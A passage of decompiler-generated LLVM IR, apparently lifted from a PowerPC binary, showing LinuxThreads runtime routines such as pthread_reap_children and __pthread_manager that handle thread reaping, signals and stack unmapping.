  %v1_10007644 = call i32 @__asm_rlwinm(i32 %v3_10007640, i32 4, i32 18, i32 27)
  %v2_10007648 = add i32 %v1_10007644, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %v2_10007648, i32* @r29, align 4
  store i32 %v2_10007648, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007654.295 to i32), i32* @lr, align 4
  %v0_10007650 = call i32 @__pthread_lock()
  %v1_10007658 = load i32, i32* @r29, align 4
  %v2_10007658 = add i32 %v1_10007658, 8
  %v3_10007658 = inttoptr i32 %v2_10007658 to i32*
  store i32 0, i32* %v3_10007658, align 4
  %v1_10007660 = load i32, i32* @r29, align 4
  %v2_10007660 = add i32 %v1_10007660, 12
  %v3_10007660 = inttoptr i32 %v2_10007660 to i32*
  store i32 -1, i32* %v3_10007660, align 4
  %v0_10007664 = load i32, i32* @r29, align 4
  store i32 %v0_10007664, i32* @r3, align 4
  store i32 268465772, i32* @lr, align 4
  %v0_10007668 = call i32 @__pthread_unlock()
  %v3_10007670 = load i32, i32* @global_var_1002ef70.296, align 4
  %v1_10007674 = add i32 %v3_10007670, -1
  store i32 %v1_10007674, i32* @global_var_1002ef70.296, align 4
  %v0_1000767c = load i32, i32* @r31, align 4
  %v1_1000767c = add i32 %v0_1000767c, 448
  %v2_1000767c = inttoptr i32 %v1_1000767c to i32*
  %v3_1000767c = load i32, i32* %v2_1000767c, align 4
  %v3_1000768c7 = icmp eq i32 %v3_1000767c, 0
  store i32 %v3_1000767c, i32* @r3, align 4
  br i1 %v3_1000768c7, label %dec_label_pc_10007698, label %dec_label_pc_10007684

dec_label_pc_10007684:                            ; preds = %entry, %dec_label_pc_10007684
  %v0_10007684 = phi i32 [ %v0_1000768c.pr, %dec_label_pc_10007684 ], [ %v3_1000767c, %entry ]
  %v1_10007684 = inttoptr i32 %v0_10007684 to i32*
  %v2_10007684 = load i32, i32* %v1_10007684, align 4
  store i32 %v2_10007684, i32* @r29, align 4
  store i32 268465804, i32* @lr, align 4
  %v0_10007688 = call i32 @free()
  %v0_1000768c.pr = load i32, i32* @r29, align 4
  %v3_1000768c = icmp eq i32 %v0_1000768c.pr, 0
  store i32 %v0_1000768c.pr, i32* @r3, align 4
  br i1 %v3_1000768c, label %dec_label_pc_1000768c.dec_label_pc_10007698_crit_edge, label %dec_label_pc_10007684

dec_label_pc_1000768c.dec_label_pc_10007698_crit_edge: ; preds = %dec_label_pc_10007684
  %v0_10007698.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007698

dec_label_pc_10007698:                            ; preds = %dec_label_pc_1000768c.dec_label_pc_10007698_crit_edge, %entry
  %v0_10007698 = phi i32 [ %v0_10007698.pre, %dec_label_pc_1000768c.dec_label_pc_10007698_crit_edge ], [ %v0_1000767c, %entry ]
  %v1_10007698 = add i32 %v0_10007698, 452
  %v2_10007698 = inttoptr i32 %v1_10007698 to i32*
  %v3_10007698 = load i32, i32* %v2_10007698, align 4
  %v3_100076a83 = icmp eq i32 %v3_10007698, 0
  store i32 %v3_10007698, i32* @r3, align 4
  br i1 %v3_100076a83, label %dec_label_pc_100076b4, label %dec_label_pc_100076a0

dec_label_pc_100076a0:                            ; preds = %dec_label_pc_10007698, %dec_label_pc_100076a0
  %v0_100076a0 = phi i32 [ %v0_100076a8.pr, %dec_label_pc_100076a0 ], [ %v3_10007698, %dec_label_pc_10007698 ]
  %v1_100076a0 = inttoptr i32 %v0_100076a0 to i32*
  %v2_100076a0 = load i32, i32* %v1_100076a0, align 4
  store i32 %v2_100076a0, i32* @r29, align 4
  store i32 268465832, i32* @lr, align 4
  %v0_100076a4 = call i32 @free()
  %v0_100076a8.pr = load i32, i32* @r29, align 4
  %v3_100076a8 = icmp eq i32 %v0_100076a8.pr, 0
  store i32 %v0_100076a8.pr, i32* @r3, align 4
  br i1 %v3_100076a8, label %dec_label_pc_100076a8.dec_label_pc_100076b4_crit_edge, label %dec_label_pc_100076a0

dec_label_pc_100076a8.dec_label_pc_100076b4_crit_edge: ; preds = %dec_label_pc_100076a0
  %v0_100076bc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100076b4

dec_label_pc_100076b4:                            ; preds = %dec_label_pc_100076a8.dec_label_pc_100076b4_crit_edge, %dec_label_pc_10007698
  %v0_100076dc = phi i32 [ %v0_100076bc.pre, %dec_label_pc_100076a8.dec_label_pc_100076b4_crit_edge ], [ %v0_10007698, %dec_label_pc_10007698 ]
  %v4_100076bc = icmp eq i32 %v0_100076dc, ptrtoint (i32* @global_var_1002a760 to i32)
  br i1 %v4_100076bc, label %dec_label_pc_100076f4, label %dec_label_pc_100076c4

dec_label_pc_100076c4:                            ; preds = %dec_label_pc_100076b4
  %v1_100076c4 = add i32 %v0_100076dc, 392
  %v2_100076c4 = inttoptr i32 %v1_100076c4 to i32*
  %v3_100076c4 = load i32, i32* %v2_100076c4, align 4
  %v3_100076c8 = icmp eq i32 %v3_100076c4, 0
  br i1 %v3_100076c8, label %dec_label_pc_100076d0, label %dec_label_pc_100076f4

dec_label_pc_100076d0:                            ; preds = %dec_label_pc_100076c4
  %v1_100076d0 = add i32 %v0_100076dc, 400
  %v2_100076d0 = inttoptr i32 %v1_100076d0 to i32*
  %v3_100076d0 = load i32, i32* %v2_100076d0, align 4
  %v3_100076d4 = icmp eq i32 %v3_100076d0, 0
  br i1 %v3_100076d4, label %dec_label_pc_100076e4, label %dec_label_pc_100076dc

dec_label_pc_100076dc:                            ; preds = %dec_label_pc_100076d0
  %v1_100076dc = add i32 %v0_100076dc, 396
  %v2_100076dc = inttoptr i32 %v1_100076dc to i32*
  %v3_100076dc = load i32, i32* %v2_100076dc, align 4
  store i32 268465892, i32* @lr, align 4
  %v2_100076e0 = call i32 @munmap(i32 %v3_100076dc, i32 %v3_100076d0)
  %v0_100076e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100076e4

dec_label_pc_100076e4:                            ; preds = %dec_label_pc_100076d0, %dec_label_pc_100076dc
  %v0_100076e4 = phi i32 [ %v0_100076dc, %dec_label_pc_100076d0 ], [ %v0_100076e4.pre, %dec_label_pc_100076dc ]
  %v1_100076ec = add i32 %v0_100076e4, -2096672
  store i32 268465908, i32* @lr, align 4
  %v2_100076f0 = call i32 @munmap(i32 %v1_100076ec, i32 2097152)
  br label %dec_label_pc_100076f4

dec_label_pc_100076f4:                            ; preds = %dec_label_pc_100076c4, %dec_label_pc_100076b4, %dec_label_pc_100076e4
  %v0_10007704 = phi i32 [ 0, %dec_label_pc_100076c4 ], [ 0, %dec_label_pc_100076b4 ], [ %v2_100076f0, %dec_label_pc_100076e4 ]
  ret i32 %v0_10007704

; uselistorder directives
  uselistorder i32 %v0_100076a8.pr, { 1, 2, 0 }
  uselistorder i32 %v0_1000768c.pr, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002a760 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_100076f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100076e4, { 1, 0 }
  uselistorder label %dec_label_pc_100076a0, { 1, 0 }
  uselistorder label %dec_label_pc_10007684, { 1, 0 }
}

define i32 @restart.4() local_unnamed_addr {
entry:
  store i32 268465944, i32* @lr, align 4
  %v0_10007714 = call i32 @__pthread_restart_new()
  ret i32 %v0_10007714
}

define i32 @pthread_reap_children(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10007844 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10007844, i32* @r4, align 4
  store i32 268466252, i32* @lr, align 4
  %v3_100078489 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10007844, i32 -2147483647)
  %v2_1000784c10 = icmp sgt i32 %v3_100078489, 0
  br i1 %v2_1000784c10, label %dec_label_pc_100077e8, label %dec_label_pc_10007854

dec_label_pc_100077e8:                            ; preds = %entry, %dec_label_pc_10007838.backedge
  %v3_100077ec = load i32, i32* @global_var_1002f024.294, align 4
  %v3_100077f0 = icmp eq i32 %v3_100077ec, 0
  br i1 %v3_100077f0, label %dec_label_pc_10007810, label %dec_label_pc_100077f8

dec_label_pc_100077f8:                            ; preds = %dec_label_pc_100077e8
  %v3_10007740 = load i32, i32* @global_var_1002ef30, align 4
  store i32 %v3_10007740, i32* @r3, align 4
  store i32 268466192, i32* @lr, align 4
  %v0_1000780c = call i32 @restart.4()
  br label %dec_label_pc_10007810

dec_label_pc_10007810:                            ; preds = %dec_label_pc_100077e8, %dec_label_pc_100077f8
  %v3_10007810 = load i32, i32* %stack_var_-40, align 4
  %v1_10007814 = urem i32 %v3_10007810, 128
  %v1_10007818 = mul nuw nsw i32 %v1_10007814, 16777216
  %v1_1000781c = add nuw i32 %v1_10007818, 16777216
  %v2_1000781c = sdiv i32 %v1_1000781c, 16777216
  %v1_10007820 = udiv i32 %v2_1000781c, 2
  %v2_10007820 = and i32 %v2_1000781c, -2147483648
  %v3_10007820 = or i32 %v1_10007820, %v2_10007820
  %tmp8 = icmp slt i32 %v3_10007820, 1
  br i1 %tmp8, label %dec_label_pc_10007838.backedge, label %dec_label_pc_10007828

dec_label_pc_10007828:                            ; preds = %dec_label_pc_10007810
  store i32 ptrtoint ([3 x i8]* @global_var_10007830.298 to i32), i32* @lr, align 4
  %v2_1000782c = call i32 @pthread_kill_all_threads(i32 %v1_10007814, i32 1)
  %v1_10007834 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10007838.backedge

dec_label_pc_10007838.backedge:                   ; preds = %dec_label_pc_10007828, %dec_label_pc_10007810
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10007844, i32* @r4, align 4
  store i32 268466252, i32* @lr, align 4
  %v3_10007848 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10007844, i32 -2147483647)
  %v2_1000784c = icmp sgt i32 %v3_10007848, 0
  br i1 %v2_1000784c, label %dec_label_pc_100077e8, label %dec_label_pc_10007854

dec_label_pc_10007854:                            ; preds = %dec_label_pc_10007838.backedge, %entry
  %v3_10007848.lcssa = phi i32 [ %v3_100078489, %entry ], [ %v3_10007848, %dec_label_pc_10007838.backedge ]
  ret i32 %v3_10007848.lcssa

; uselistorder directives
  uselistorder i32 %v2_1000781c, { 1, 0 }
  uselistorder i32 %v2_10007844, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 0, 1 }
  uselistorder i32 268466252, { 1, 0 }
  uselistorder i32 -2147483647, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10007810, { 1, 0 }
  uselistorder label %dec_label_pc_100077e8, { 1, 0 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-360 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002a940.248 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002a988.299 to i32), i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002a990.300 to i32), i32* %r0.global-to-local, align 4
  %v2_10007888 = ptrtoint i32* %stack_var_-352 to i32
  store i32 ptrtoint (i32* @global_var_1002a990.300 to i32), i32* @global_var_1002a98c.301, align 4
  store i32 ptrtoint (i32* @global_var_1002a940.248 to i32), i32* @r2, align 4
  store i32 ptrtoint (i32* @global_var_1002a988.299 to i32), i32* bitcast (i32** @global_var_1002a984.302 to i32*), align 4
  store i32 %arg1, i32* %r21.global-to-local, align 4
  store i32 %v2_10007888, i32* %r3.global-to-local, align 4
  store i32 268466340, i32* @lr, align 4
  %v1_100078a0 = call i32 @sigfillset(i32 %v2_10007888)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100078a8 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 %v3_100078a8, i32* %r4.global-to-local, align 4
  store i32 %v2_10007888, i32* @r3, align 4
  store i32 268466356, i32* @lr, align 4
  %v1_100078b0 = call i32 @__GI_sigdelset(i32 %v2_10007888)
  store i32 %v2_10007888, i32* @r3, align 4
  store i32 5, i32* %r4.global-to-local, align 4
  store i32 268466368, i32* @lr, align 4
  %v1_100078bc = call i32 @__GI_sigdelset(i32 %v2_10007888)
  store i32 %v1_100078bc, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100078c4 = load i32, i32* @global_var_1002f03c.256, align 4
  store i32 %v3_100078c4, i32* %r0.global-to-local, align 4
  %v3_100078c8 = icmp eq i32 %v3_100078c4, 0
  store i1 %v3_100078c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078c8, label %dec_label_pc_100078e8, label %dec_label_pc_100078d0

dec_label_pc_100078d0:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100078d4 = load i32, i32* @global_var_1002ef5c.230, align 4
  store i32 %v3_100078d4, i32* %r4.global-to-local, align 4
  %v3_100078d8 = icmp eq i32 %v3_100078d4, 0
  store i1 %v3_100078d8, i1* %cr7_eq.global-to-local, align 1
  %tmp26 = icmp slt i32 %v3_100078d4, 1
  br i1 %tmp26, label %dec_label_pc_100078e8, label %dec_label_pc_100078e0

dec_label_pc_100078e0:                            ; preds = %dec_label_pc_100078d0
  store i32 %v2_10007888, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100078e8.303 to i32), i32* @lr, align 4
  %v1_100078e4 = call i32 @__GI_sigdelset(i32 %v2_10007888)
  store i32 %v1_100078e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100078e8

dec_label_pc_100078e8:                            ; preds = %dec_label_pc_100078d0, %entry, %dec_label_pc_100078e0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v2_10007888, i32* %r4.global-to-local, align 4
  store i32 268466424, i32* @lr, align 4
  %v3_100078f4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10007888, i32 0)
  store i32 %v3_100078f4, i32* %r3.global-to-local, align 4
  %v3_100078fc = load i32, i32* @global_var_1002ef30, align 4
  store i32 %v3_100078fc, i32* %r9.global-to-local, align 4
  %v1_10007900 = add i32 %v3_100078fc, 24
  %v2_10007900 = inttoptr i32 %v1_10007900 to i32*
  %v3_10007900 = load i32, i32* %v2_10007900, align 4
  store i32 %v3_10007900, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007908.304 to i32), i32* @lr, align 4
  %v1_10007904 = call i32 @__pthread_manager_adjust_prio(i32 %v3_10007900)
  store i32 %v1_10007904, i32* %r3.global-to-local, align 4
  %v2_10007908 = ptrtoint i32* %stack_var_-224 to i32
  br label %dec_label_pc_10007908

dec_label_pc_10007908:                            ; preds = %dec_label_pc_10007924, %dec_label_pc_100078e8
  %v0_1000790c = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_1000790c, i32* %r3.global-to-local, align 4
  store i32 %v2_10007908, i32* %r4.global-to-local, align 4
  store i32 268466460, i32* @lr, align 4
  %v1_10007918 = call i32 @__libc_read(i32 %v0_1000790c)
  store i32 %v1_10007918, i32* %r3.global-to-local, align 4
  %v3_1000791c = icmp eq i32 %v1_10007918, -1
  store i1 %v3_1000791c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000791c, label %dec_label_pc_10007924, label %dec_label_pc_10007934

dec_label_pc_10007924:                            ; preds = %dec_label_pc_10007908
  %v0_10007924 = call i32 @__errno_location()
  store i32 %v0_10007924, i32* %r3.global-to-local, align 4
  %v1_10007928 = inttoptr i32 %v0_10007924 to i32*
  %v2_10007928 = load i32, i32* %v1_10007928, align 4
  store i32 %v2_10007928, i32* %r0.global-to-local, align 4
  %v3_1000792c = icmp eq i32 %v2_10007928, 4
  store i1 %v3_1000792c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000792c, label %dec_label_pc_10007908, label %dec_label_pc_10007934

dec_label_pc_10007934:                            ; preds = %dec_label_pc_10007908, %dec_label_pc_10007924
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10007938 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10007938, i32* %stack_var_-360, align 4
  %v2_10007948 = ptrtoint i32* %stack_var_-360 to i32
  %v4_10007994 = zext i16 %tmp17 to i32
  %tmp = urem i16 %tmp17, 2
  %v1_10007998 = zext i16 %tmp to i32
  %v3_10007998 = icmp eq i16 %tmp, 0
  %v2_100079b4 = icmp ugt i32 %tmp16, 5
  %v3_100079b4 = icmp eq i32 %tmp16, 5
  %v2_10007c50 = ptrtoint i32* %stack_var_-204 to i32
  %v1_100079c0 = mul i32 %tmp16, 4
  %v2_100079c8 = add i32 %v1_100079c0, ptrtoint (i32* @global_var_10018954.306 to i32)
  %v3_100079c8 = inttoptr i32 %v2_100079c8 to i32*
  br label %dec_label_pc_10007940

dec_label_pc_10007940:                            ; preds = %dec_label_pc_1000798c, %dec_label_pc_100079a0, %dec_label_pc_10007994, %dec_label_pc_10007f00, %dec_label_pc_10007934
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 %v2_10007948, i32* %r3.global-to-local, align 4
  store i32 268466512, i32* @lr, align 4
  %v3_1000794c = call i32 @__libc_poll(i32 %v2_10007948, i32 1, i32 2000)
  store i32 %v3_1000794c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000794c, i32* @r31, align 4
  store i32 268466520, i32* @lr, align 4
  %v0_10007954 = call i32 @getppid()
  store i32 %v0_10007954, i32* %r3.global-to-local, align 4
  %v3_10007958 = icmp eq i32 %v0_10007954, 1
  store i1 %v3_10007958, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007958, label %dec_label_pc_10007960, label %dec_label_pc_10007970

dec_label_pc_10007960:                            ; preds = %dec_label_pc_10007940
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000796c.305 to i32), i32* @lr, align 4
  %v2_10007968 = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10007ed8 = call i32 @__GI__exit(i32 0)
  store i32 %v1_10007ed8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @global_var_1002f024.294, align 4
  store i32 268467948, i32* @lr, align 4
  %v2_10007ee8 = call i32 @pthread_reap_children(i32 %v1_10007ed8, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v3_10007ef0 = load i32, i32* @global_var_1002ef30, align 4
  store i32 %v3_10007ef0, i32* %r9.global-to-local, align 4
  store i32 %v3_10007ef0, i32* @r3, align 4
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10007f00

dec_label_pc_10007970:                            ; preds = %dec_label_pc_10007940
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007974 = load i32, i32* @global_var_1002f020.293, align 4
  store i32 %v3_10007974, i32* %r0.global-to-local, align 4
  %v3_10007978 = icmp eq i32 %v3_10007974, 0
  store i1 %v3_10007978, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007978, label %dec_label_pc_1000798c, label %dec_label_pc_10007980

dec_label_pc_10007980:                            ; preds = %dec_label_pc_10007970
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_1002f020.293, align 4
  store i32 268466572, i32* @lr, align 4
  %v2_10007988 = call i32 @pthread_reap_children(i32 %v0_10007954, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v2_10007988, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000798c

dec_label_pc_1000798c:                            ; preds = %dec_label_pc_10007970, %dec_label_pc_10007980
  %v0_1000798c = load i32, i32* @r31, align 4
  %v3_1000798c = icmp eq i32 %v0_1000798c, 1
  store i1 %v3_1000798c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000798c, label %dec_label_pc_10007994, label %dec_label_pc_10007940

dec_label_pc_10007994:                            ; preds = %dec_label_pc_1000798c
  store i32 %v4_10007994, i32* %r0.global-to-local, align 4
  store i32 %v1_10007998, i32* %r9.global-to-local, align 4
  br i1 %v3_10007998, label %dec_label_pc_10007940, label %dec_label_pc_100079a0

dec_label_pc_100079a0:                            ; preds = %dec_label_pc_10007994
  %v0_100079a0 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100079a0, i32* %r3.global-to-local, align 4
  store i32 %v2_10007908, i32* %r4.global-to-local, align 4
  store i32 268466608, i32* @lr, align 4
  %v1_100079ac = call i32 @__libc_read(i32 %v0_100079a0)
  store i32 %v1_100079ac, i32* %r3.global-to-local, align 4
  store i32 %tmp16, i32* %r0.global-to-local, align 4
  store i1 %v3_100079b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100079b4, label %dec_label_pc_10007940, label %dec_label_pc_100079bc

dec_label_pc_100079bc:                            ; preds = %dec_label_pc_100079a0
  store i32 %v1_100079c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10018954.306 to i32), i32* %r9.global-to-local, align 4
  %v4_100079c8 = load i32, i32* %v3_100079c8, align 4
  %v2_100079cc = add i32 %v4_100079c8, ptrtoint (i32* @global_var_10018954.306 to i32)
  store i32 %v2_100079cc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_100079cc)
  store i32 268466656, i32* @lr, align 4
  %v0_100079dc = call i32 @__GI_getpagesize()
  store i32 %v0_100079dc, i32* %r3.global-to-local, align 4
  %v3_100079e0 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_100079e0, i32* %r23.global-to-local, align 4
  store i32 %v0_100079dc, i32* %r27.global-to-local, align 4
  %v0_100079e8 = load i32, i32* @r30, align 4
  %v3_100079e8 = icmp eq i32 %v0_100079e8, 0
  store i1 %v3_100079e8, i1* %cr7_eq.global-to-local, align 1
  %v1_100079f4 = add i32 %v3_100079e0, 20
  %v2_100079f4 = inttoptr i32 %v1_100079f4 to i32*
  %v3_100079f4 = load i32, i32* %v2_100079f4, align 4
  store i32 %v3_100079f4, i32* %r22.global-to-local, align 4
  %v1_100079f8 = add i32 %v3_100079e0, 412
  %v2_100079f8 = inttoptr i32 %v1_100079f8 to i32*
  %v3_100079f8 = load i32, i32* %v2_100079f8, align 4
  store i32 %v3_100079f8, i32* %r18.global-to-local, align 4
  br i1 %v3_100079e8, label %dec_label_pc_10007a20.preheader, label %dec_label_pc_10007a00

dec_label_pc_10007a00:                            ; preds = %dec_label_pc_100079bc
  %v1_10007a00 = add i32 %v0_100079e8, 4
  %v2_10007a00 = inttoptr i32 %v1_10007a00 to i32*
  %v3_10007a00 = load i32, i32* %v2_10007a00, align 4
  store i32 %v3_10007a00, i32* %r0.global-to-local, align 4
  %v3_10007a04 = icmp eq i32 %v3_10007a00, 0
  store i1 %v3_10007a04, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a04, label %dec_label_pc_10007a20.preheader, label %dec_label_pc_10007a0c

dec_label_pc_10007a0c:                            ; preds = %dec_label_pc_10007a00
  store i32 268466704, i32* @lr, align 4
  %v0_10007a0c = call i32 @geteuid()
  %v3_10007a10 = icmp eq i32 %v0_10007a0c, 0
  store i1 %v3_10007a10, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10007a10, label %dec_label_pc_10007a20.preheader, label %dec_label_pc_10007df0

dec_label_pc_10007a20.preheader:                  ; preds = %dec_label_pc_10007a0c, %dec_label_pc_10007a00, %dec_label_pc_100079bc
  store i32 2, i32* %r24.global-to-local, align 4
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10007a28

dec_label_pc_10007a28:                            ; preds = %dec_label_pc_10007a20.preheader, %dec_label_pc_10007b44
  %v0_10007acc = phi i32 [ 2, %dec_label_pc_10007a20.preheader ], [ %v1_10007b44, %dec_label_pc_10007b44 ]
  %v1_10007a2c = mul i32 %v0_10007acc, 16
  store i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), i32* %r9.global-to-local, align 4
  %v2_10007a34 = add i32 %v1_10007a2c, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %v2_10007a34, i32* %r11.global-to-local, align 4
  %v1_10007a38 = add i32 %v1_10007a2c, add (i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), i32 8)
  %v2_10007a38 = inttoptr i32 %v1_10007a38 to i32*
  %v3_10007a38 = load i32, i32* %v2_10007a38, align 4
  store i32 %v3_10007a38, i32* %r0.global-to-local, align 4
  %v3_10007a3c = icmp eq i32 %v3_10007a38, 0
  store i1 %v3_10007a3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a3c, label %dec_label_pc_10007a44, label %dec_label_pc_10007b44

dec_label_pc_10007a44:                            ; preds = %dec_label_pc_10007a28
  %v0_10007a44 = load i32, i32* @r30, align 4
  %v3_10007a44 = icmp eq i32 %v0_10007a44, 0
  store i1 %v3_10007a44, i1* %cr7_eq.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007a4c = load i32, i32* @global_var_1002effc.231, align 4
  store i32 %v3_10007a4c, i32* %r11.global-to-local, align 4
  br i1 %v3_10007a44, label %dec_label_pc_10007a8c, label %dec_label_pc_10007a54

dec_label_pc_10007a54:                            ; preds = %dec_label_pc_10007a44
  %v1_10007a54 = add i32 %v0_10007a44, 24
  %v2_10007a54 = inttoptr i32 %v1_10007a54 to i32*
  %v3_10007a54 = load i32, i32* %v2_10007a54, align 4
  store i32 %v3_10007a54, i32* %r0.global-to-local, align 4
  %v3_10007a58 = icmp eq i32 %v3_10007a54, 0
  store i1 %v3_10007a58, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a58, label %dec_label_pc_10007a8c, label %dec_label_pc_10007a60

dec_label_pc_10007a60:                            ; preds = %dec_label_pc_10007a54
  %v1_10007a60 = add i32 %v0_10007a44, 28
  %v2_10007a60 = inttoptr i32 %v1_10007a60 to i32*
  %v3_10007a60 = load i32, i32* %v2_10007a60, align 4
  store i32 %v3_10007a60, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  %v1_10007a68 = add i32 %v0_10007a44, 32
  %v2_10007a68 = inttoptr i32 %v1_10007a68 to i32*
  %v3_10007a68 = load i32, i32* %v2_10007a68, align 4
  store i32 %v3_10007a68, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v1_10007a70 = call i32 @__asm_rlwinm(i32 %v3_10007a60, i32 0, i32 0, i32 29)
  store i32 %v1_10007a70, i32* %r11.global-to-local, align 4
  %v0_10007a74 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007a74 = sub i32 %v3_10007a60, %v0_10007a74
  store i32 %v2_10007a74, i32* %r27.global-to-local, align 4
  %v1_10007a78 = add i32 %v1_10007a70, -480
  store i32 %v1_10007a78, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* @global_var_1002f02c.307, align 4
  br label %dec_label_pc_10007b4c

dec_label_pc_10007a8c:                            ; preds = %dec_label_pc_10007a54, %dec_label_pc_10007a44
  store i1 %v3_10007a44, i1* %cr7_eq.global-to-local, align 1
  store i32 2097152, i32* %r0.global-to-local, align 4
  %v0_10007a94 = load i32, i32* %r27.global-to-local, align 4
  %v2_10007a94 = sub i32 2097152, %v0_10007a94
  store i32 %v2_10007a94, i32* %r29.global-to-local, align 4
  br i1 %v3_10007a44, label %dec_label_pc_10007abc, label %dec_label_pc_10007a9c

dec_label_pc_10007a9c:                            ; preds = %dec_label_pc_10007a8c
  %v1_10007a9c = add i32 %v0_10007a44, 32
  %v2_10007a9c = inttoptr i32 %v1_10007a9c to i32*
  %v3_10007a9c = load i32, i32* %v2_10007a9c, align 4
  %v2_10007aa0 = add i32 %v0_10007a94, -1
  %v1_10007aa4 = add i32 %v2_10007aa0, %v3_10007a9c
  %v2_10007aa8 = urem i32 %v1_10007aa4, %v0_10007a94
